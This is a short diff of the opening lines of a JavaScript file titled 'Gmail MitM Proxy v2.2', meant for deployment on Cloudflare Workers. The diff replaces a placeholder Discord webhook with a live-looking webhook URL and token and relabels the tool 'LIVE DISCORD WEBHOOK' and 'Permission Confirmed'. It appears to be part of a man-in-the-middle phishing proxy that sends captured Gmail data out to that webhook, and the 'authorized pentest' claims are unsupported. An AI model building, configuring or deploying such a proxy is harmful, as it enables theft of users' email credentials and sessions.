@@ -1,8 +1,8 @@
-// Gmail MitM Proxy v2.2 - NGINX-STYLE MASKING + PRODUCTION PENTEST
-// Deploy: Cloudflare Workers → Create → Paste → Deploy
-// AUTHORIZED PENTEST USE ONLY
+// Gmail MitM Proxy v2.2 - LIVE DISCORD WEBHOOK
+// Deploy: Cloudflare Workers → Edit → Paste → Deploy
+// AUTHORIZED PENTEST - Permission Confirmed
 
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR-WEBHOOK-ID-HERE'; // ← REPLACE!
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1466098541880672500/C6sx-mBMSy3wW41IW0AnIGJoMfJNAa2905NeLyFCqHq6hArN4kGWC3k51S_HyNdplehC';
 const RATE_LIMIT = new Map();
 
 addEventListener('fetch', event => {
